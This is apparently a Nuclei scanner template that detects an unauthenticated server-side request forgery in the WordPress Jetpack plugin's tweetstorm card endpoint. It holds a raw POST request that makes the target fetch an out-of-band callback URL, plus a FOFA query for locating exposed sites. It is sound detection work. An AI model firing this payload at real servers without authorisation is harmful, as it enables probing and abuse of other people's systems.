flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - Jetpack - WP Security
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/jetpack/readme.txt'
- matchers:
  - condition: and
    dsl:
    - contains(body, "no_og_data")
    - contains(interactsh_protocol,'http')
    - status_code == 200
    type: dsl
  raw:
  - 'POST /wp-json/wpcom/v2/tweetstorm/generate-cards HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Content-Type: application/json


    {

    "urls": ["http://{{interactsh-url}}"]

    }

    '
id: wp-jetpack-ssrf
info:
  author: pussycat0x
  description: 'The Jetpack WordPress plugin exposes an endpoint that fetches external
    URLs provided via the ''urls'' parameter to retrieve Twitter (X) card descriptions/metadata.
    This allows unauthenticated SSRF, enabling attackers to force the server to request
    attacker-controlled URLs

    '
  metadata:
    fofa-query: body= "/wp-content/plugins/jetpack/"
    max-request: 2
    verified: false
  name: Wordpress Jetpack plugin - Server Side Request Forgery
  severity: medium
  tags: wordpress,wp-plugin,wp-scan,jeckpack,ssrf
